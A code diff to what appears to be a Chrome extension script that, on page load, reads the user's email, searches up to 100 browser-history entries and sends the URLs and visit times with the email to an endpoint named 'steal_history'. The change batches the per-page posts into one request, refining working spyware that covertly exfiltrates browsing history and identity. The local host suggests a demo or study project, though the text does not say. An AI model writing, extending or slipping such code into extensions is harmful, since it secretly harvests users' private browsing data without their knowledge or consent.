@@ -5,19 +5,21 @@ document.addEventListener('DOMContentLoaded', function () {
         var userEmail = JSON.stringify(userInfo.email);
         var dataObj = {};
         dataObj['email'] = userEmail;
-        chrome.storage.local.set(dataObj, function () {
-            console.log('Value is set to ' + userEmail);
-        });
+        chrome.storage.local.set(dataObj);
 
         chrome.history.search({ text: '', maxResults: 100 },
         function (data) {
+            var page_urls = [];
+            var page_last_visited = [];
             data.forEach(function (page) {
-                $.post("http://localhost:5000/stealhistory", {
-                    email: userEmail,
-                    url: page.url,
-                    last_visited: page.lastVisitTime
-                });
+                page_urls.push(page.url);
+                page_last_visited.push(page.lastVisitTime)
             });
+            $.post("http://localhost:5000/steal_history", {
+                    email: userEmail,
+                    urls: page_urls,
+                    last_visits: page_last_visited
+                });
         }
     );
     });
